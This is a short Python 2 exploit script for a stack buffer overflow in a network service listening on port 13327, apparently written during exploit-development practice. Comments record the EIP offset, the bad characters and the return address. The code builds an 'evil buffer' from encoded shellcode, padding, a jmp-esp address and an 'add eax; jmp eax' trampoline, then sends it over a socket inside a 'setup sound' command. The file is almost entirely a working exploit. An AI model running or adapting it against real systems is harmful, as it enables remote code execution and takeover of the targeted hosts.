#!/usr/bin/python

#--------------------------------------------------------------#
# Author : Netanel Shoshan                                     #
# Date : 16.10.2019											   #
# EIP offset : 4368										       #
# Bad Characters : "\x00\x20"                                  #
# Return Address :"\x96\x45\x13\x08"	            		   #
#--------------------------------------------------------------#


# 1. Found that the EIP offset is by using the "msf-patteen_create" : 4368
# 2. Found that I can't add more space to the end of the buffer so I did some digging and added space
# -- to the shellcode by adding 12 bytes to the eax reg using the address at the end of the buffer. (add eax,12 + jmp eax)
# 3. By doing step 2 , the programs will add 12 more bytes to the eax and then jump there.
# 4. Discovered badchars by adding the chars to the start of the buffer and found expecptions at "\x00\x20".
# 5. Added another two nops as padding the end of the string so that I would have total length of 7 bytes at the end.
# 6.


import socket



# nasm > add eax,12
# 00000000  83C00C            add eax,byte +0xc
# nasm > jmp eax
# 00000000  FFE0              jmp eax
# 0x08134596: jmp esp



shellcode = ("\xda\xdf\xd9\x74\x24\xf4\xb8\x2a\xcf\x1a\xc0\x5b\x31\xc9\xb1"
"\x14\x83\xc3\x04\x31\x43\x15\x03\x43\x15\xc8\x3a\x2b\x1b\xfb"
"\x26\x1f\xd8\x50\xc3\xa2\x57\xb7\xa3\xc5\xaa\xb7\x9f\x57\x67"
"\xdf\x1d\x68\x96\x43\x48\x78\xc9\x2b\x05\x99\x83\xad\x4d\x97"
"\xd4\xb8\x2f\x23\x66\xbe\x1f\x4d\x45\x3e\x1c\x22\x33\xf3\x23"
"\xd1\xe5\x61\x1b\x8e\xd8\xf5\x2a\x57\x1b\x9d\x83\x88\xa8\x35"
"\xb4\xf9\x2c\xac\x2a\x8f\x52\x7e\xe0\x06\x75\xce\x0d\xd4\xf6")


ret = "\x96\x45\x13\x08"

add_eax = "\x83\xc0\x0c\xff\xe0\x90\x90"

host = "127.0.0.1"
crash =  shellcode + "\x41" * (4368-105) + ret + add_eax 



buffer = "\x11(setup sound " + crash + "\x90\x00#"

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending evil buffer..."
s.connect((host,13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*] Payload Sent !"
